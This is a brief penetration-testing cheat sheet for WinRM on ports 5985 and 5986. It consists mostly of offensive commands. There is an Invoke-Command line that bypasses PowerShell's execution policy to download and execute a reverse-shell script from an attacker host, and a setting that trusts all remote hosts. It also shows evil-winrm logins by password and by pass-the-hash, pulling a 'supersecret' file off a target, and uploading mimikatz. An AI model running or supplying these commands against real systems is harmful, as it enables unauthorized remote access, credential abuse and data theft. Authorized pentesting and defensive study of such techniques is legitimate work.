# Port 5985,5986 - WinRM

[WinRM Pentesting](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

## **Initiating WinRM Session**

We first have to configure our attack machine to work with WinRM as well. We need to enable it and add any "victims" as trusted hosts. From an elevated PowerShell prompt, run the following two commands:

```bash
# Target Windows Terminal
PS> Enable-PSRemoting -Force  
PS> Set-Item wsman:\localhost\client\trustedhosts *
```

Execute Commands via PS Remoting

{% code overflow="wrap" %}
```bash
# Target Windows Terminal

# Run a reverse shell
PS> Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/shell.ps1')"}

# Run a command
PS> Invoke-Command -computername <computername> -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
{% endcode %}

### Using Evil-WinRm

```bash
# Install 
gem install evil-winrm

# Remote access
evil-winrm -u Administrator -p '<Password>' -i <IP>
evil-winrm -u <username> -H <Hash> -i <IP>

# File transfer
download       # download to your kali
# download C:\temp\supersecret.txt /opt/Juggernaut/JUGG-Backup/supersecret.txt
upload         # upload to a target machine
# upload /opt/Windows/exploits/executables/mimikatz.exe C:\temp\mimikatz.exe
```
